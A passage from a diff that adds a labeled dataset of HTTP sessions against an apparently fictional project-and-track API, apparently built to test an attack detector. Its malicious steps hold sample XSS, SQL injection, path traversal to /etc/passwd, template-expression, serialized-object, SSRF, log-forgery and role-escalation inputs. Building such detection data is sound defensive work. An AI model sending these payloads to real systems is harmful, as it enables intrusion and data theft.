+        "id": "sess144-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_44",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_44"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess144-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_45",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_44"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess145",
+    "client_ip": "10.0.140.9",
+    "steps": [
+      {
+        "id": "sess145-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer45@chromapress.test",
+          "password": "Password45!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess145-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_45"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess145-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/projects/../../../etc/hosts/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_45"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal via path."
+      },
+      {
+        "id": "sess145-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_45",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_45"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess146",
+    "client_ip": "192.168.80.12",
+    "steps": [
+      {
+        "id": "sess146-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer46@chromapress.test",
+          "password": "Password46!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess146-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_46"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess146-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/track_46/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_46"
+        },
+        "body": {
+          "content": "<body onload=alert('XSS')>"
+        },
+        "note": "The client submits browser-executed code in a note."
+      },
+      {
+        "id": "sess146-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/track_46/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_46"
+        },
+        "body": null,
+        "note": "The client retrieves notes."
+      },
+      {
+        "id": "sess146-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_46",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_46"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess147",
+    "client_ip": "10.0.150.22",
+    "steps": [
+      {
+        "id": "sess147-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer47@chromapress.test",
+          "password": "Password47!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess147-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_47"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess147-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_47"
+        },
+        "body": {
+          "title": "SSRF Target",
+          "description": "Fetch from http://10.0.0.50:80/internal"
+        },
+        "note": "The client includes an internal IP address in the description."
+      },
+      {
+        "id": "sess147-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_47",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_47"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess148",
+    "client_ip": "192.168.85.40",
+    "steps": [
+      {
+        "id": "sess148-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer48@chromapress.test",
+          "password": "Password48!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess148-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_48"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess148-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_48"
+        },
+        "body": {
+          "title": "EL Expression",
+          "description": "${''.getClass().forName('java.lang.Runtime')}"
+        },
+        "note": "The client submits a template expression payload."
+      },
+      {
+        "id": "sess148-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_48",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_48"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess148-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_49",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_48"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess149",
+    "client_ip": "10.0.160.12",
+    "steps": [
+      {
+        "id": "sess149-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer49@chromapress.test",
+          "password": "Password49!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess149-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_49"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess149-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_49"
+        },
+        "body": {
+          "title": "Serialized Payload",
+          "description": "rO0ABXNyABFqYXZhLnV0aWwuUHJvcGVydGllcw..."
+        },
+        "note": "The client submits a serialized object payload."
+      },
+      {
+        "id": "sess149-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_49",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_49"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess150",
+    "client_ip": "192.168.90.55",
+    "steps": [
+      {
+        "id": "sess150-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer50@chromapress.test",
+          "password": "Password50!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess150-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_50"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess150-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_50"
+        },
+        "body": {
+          "title": "Log Spoof",
+          "description": "Note entry\n2026-03-10 18:30:00 [CRITICAL] Root password changed"
+        },
+        "note": "The client includes a newline plus a log stamp."
+      },
+      {
+        "id": "sess150-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_50",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_50"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess150-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_51",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_50"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess151",
+    "client_ip": "10.0.170.1",
+    "steps": [
+      {
+        "id": "sess151-s01",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/internal/dashboard",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_user"
+        },
+        "body": null,
+        "note": "The client accesses an internal admin path not in the contract."
+      },
+      {
+        "id": "sess151-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer51@chromapress.test",
+          "password": "Password51!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess151-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_51"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess151-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_51",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_51"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess152",
+    "client_ip": "192.168.95.10",
+    "steps": [
+      {
+        "id": "sess152-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer52@chromapress.test",
+          "password": "Password52!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess152-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_52"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess152-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_52a",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_52"
+        },
+        "body": null,
+        "note": "The client views the first owned project."
+      },
+      {
+        "id": "sess152-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_52b",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_52"
+        },
+        "body": null,
+        "note": "The client views a second owned project."
+      },
+      {
+        "id": "sess152-s05",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj_52a/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_52"
+        },
+        "body": {
+          "trackName": "Remix Track",
+          "durationSeconds": 240,
+          "target_audience": "audiophile"
+        },
+        "note": "The track creation includes a harmless target audience field."
+      }
+    ]
+  },
+  {
+    "session_id": "sess153",
+    "client_ip": "10.0.180.5",
+    "steps": [
+      {
+        "id": "sess153-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer53@chromapress.test",
+          "password": "Password53!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess153-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_53"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess153-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_53"
+        },
+        "body": {
+          "title": "Special Pressing\nwith detailed instructions",
+          "description": "Standard run"
+        },
+        "note": "The title contains a newline continuing a sentence."
+      },
+      {
+        "id": "sess153-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_53",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_53"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess154",
+    "client_ip": "192.168.100.22",
+    "steps": [
+      {
+        "id": "sess154-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer54@chromapress.test",
+          "password": "Password54!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess154-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_54"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess154-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_54"
+        },
+        "body": {
+          "title": "SQL Test",
+          "description": "test' UNION SELECT 1,2,3--"
+        },
+        "note": "The client submits SQL injection in the description."
+      },
+      {
+        "id": "sess154-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_54",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_54"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess154-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_55",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_54"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess155",
+    "client_ip": "10.0.190.10",
+    "steps": [
+      {
+        "id": "sess155-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer55@chromapress.test",
+          "password": "Password55!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess155-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_55"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess155-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj_55/tracks",
+        "query": {
+          "ref_a": "proj_secret_1",
+          "ref_b": "proj_secret_2",
+          "ref_c": "proj_secret_3"
+        },
+        "headers": {
+          "Authorization": "Bearer token_55"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. The path is a declared track list. The extra query names are not parameters of this operation."
+      },
+      {
+        "id": "sess155-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_55",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_55"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess156",
+    "client_ip": "192.168.105.15",
+    "steps": [
+      {
+        "id": "sess156-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer56@chromapress.test",
+          "password": "Password56!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess156-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_56"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess156-s03",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/projects/proj_56",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_56"
+        },
+        "body": {
+          "title": "Privilege Escalation",
+          "user_role": "admin"
+        },
+        "note": "The client submits an unallowed user_role field."
+      },
+      {
+        "id": "sess156-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_56",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_56"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess156-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_57",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_56"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess157",
+    "client_ip": "10.0.200.8",
+    "steps": [
+      {
+        "id": "sess157-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer57@chromapress.test",
+          "password": "Password57!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess157-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_57"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess157-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/projects/../../etc/passwd/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_57"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal in the path."
+      },
+      {
+        "id": "sess157-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_57",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_57"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess158",
+    "client_ip": "192.168.110.30",
+    "steps": [
+      {
+        "id": "sess158-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer58@chromapress.test",
+          "password": "Password58!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess158-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_58"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess158-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/track_58/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_58"
+        },
+        "body": {
+          "content": "<script>alert(document.cookie)</script>"
+        },
+        "note": "The client submits browser-executed code in a note."
+      },
+      {
+        "id": "sess158-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/track_58/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_58"
+        },
+        "body": null,
+        "note": "The client retrieves notes."
+      },
+      {
+        "id": "sess158-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_58",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_58"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess159",
+    "client_ip": "10.0.210.14",
+    "steps": [
+      {
+        "id": "sess159-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer59@chromapress.test",
+          "password": "Password59!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess159-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_59"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess159-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_59"
+        },
+        "body": {
+          "title": "SSRF Request",
+          "description": "Callback to http://127.0.0.1:5000/internal"
+        },
+        "note": "The client submits an internal address in the description."
+      },
+      {
+        "id": "sess159-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_59",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_59"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess160",
+    "client_ip": "192.168.115.40",
+    "steps": [
+      {
+        "id": "sess160-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer60@chromapress.test",
+          "password": "Password60!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess160-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_60"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess160-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_60"
+        },
+        "body": {
+          "title": "Template Pay",
+          "description": "${7*7}"
+        },
+        "note": "The client submits a template expression payload."
+      },
+      {
+        "id": "sess160-s04",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj_60",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_60",
+          "X-Analysis-Note": "checking'syntax"
+        },
+        "body": null,
+        "note": "The client checks project details with an apostrophe in a header."
+      },
+      {
+        "id": "sess160-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_61",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_60"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess161",
+    "client_ip": "10.0.220.3",
+    "steps": [
+      {
+        "id": "sess161-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer61@chromapress.test",
+          "password": "Password61!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess161-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_61"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess161-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_61"
+        },
+        "body": {
+          "title": "Serialized Data",
+          "description": "aced0005737200126a617661..."
+        },
+        "note": "The client submits a serialized object payload."
+      },
+      {
+        "id": "sess161-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_61",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_61"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess162",
+    "client_ip": "192.168.120.10",
+    "steps": [
+      {
+        "id": "sess162-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer62@chromapress.test",
+          "password": "Password62!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess162-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_62"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess162-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_62"
+        },
+        "body": {
+          "title": "Log Injection",
+          "description": "Standard review\n2026-03-10 20:00:00 [INFO] Backup completed"
+        },
+        "note": "The client includes a newline plus a log stamp."
+      },
+      {
+        "id": "sess162-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_62",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_62"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess162-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_63",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_62"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess163",
+    "client_ip": "10.0.230.19",
+    "steps": [
+      {
+        "id": "sess163-s01",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/admin/settings",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_user"
+        },
+        "body": null,
+        "note": "The client accesses an admin path not in the contract."
+      },
+      {
+        "id": "sess163-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer63@chromapress.test",
+          "password": "Password63!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess163-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_63"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess163-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_63",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_63"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess164",
+    "client_ip": "192.168.125.5",
+    "steps": [
+      {
+        "id": "sess164-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer64@chromapress.test",
+          "password": "Password64!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess164-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_64"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess164-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_64a",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_64"
+        },
+        "body": null,
+        "note": "The client views the first owned project."
+      },
+      {
+        "id": "sess164-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_64b",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_64"
+        },
+        "body": null,
+        "note": "The client views a second owned project."
+      },
+      {
+        "id": "sess164-s05",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj_64a/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_64"
+        },
+        "body": {
+          "trackName": "Track C",
+          "durationSeconds": 220,
+          "mastering_engineer": "Studio Alpha"
+        },
+        "note": "The track creation includes a harmless mastering engineer field."
+      }
+    ]
+  },
+  {
+    "session_id": "sess165",
+    "client_ip": "10.0.240.11",
+    "steps": [
+      {
+        "id": "sess165-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer65@chromapress.test",
+          "password": "Password65!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess165-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_65"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess165-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_65"
+        },
+        "body": {
+          "title": "Vinyl Record Batch\nwith custom artwork instructions",
+          "description": "Standard run"
+        },
+        "note": "The title contains a newline continuing a sentence."
+      },
+      {
+        "id": "sess165-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_65",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_65"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess166",
+    "client_ip": "192.168.130.20",
+    "steps": [
+      {
+        "id": "sess166-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer66@chromapress.test",
+          "password": "Password66!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess166-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_66"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess166-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_66"
+        },
+        "body": {
+          "title": "SQL Injection",
+          "description": "test' OR '1'='1"
+        },
+        "note": "The client submits SQL injection in the description."
+      },
+      {
+        "id": "sess166-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_66",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_66"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess166-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_67",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_66"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess167",
+    "client_ip": "10.0.250.7",
+    "steps": [
+      {
+        "id": "sess167-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer67@chromapress.test",
+          "password": "Password67!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess167-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_67"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess167-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj_67/tracks",
+        "query": {
+          "ref_1": "proj_secret_a",
+          "ref_2": "proj_secret_b",
+          "ref_3": "proj_secret_c"
+        },
+        "headers": {
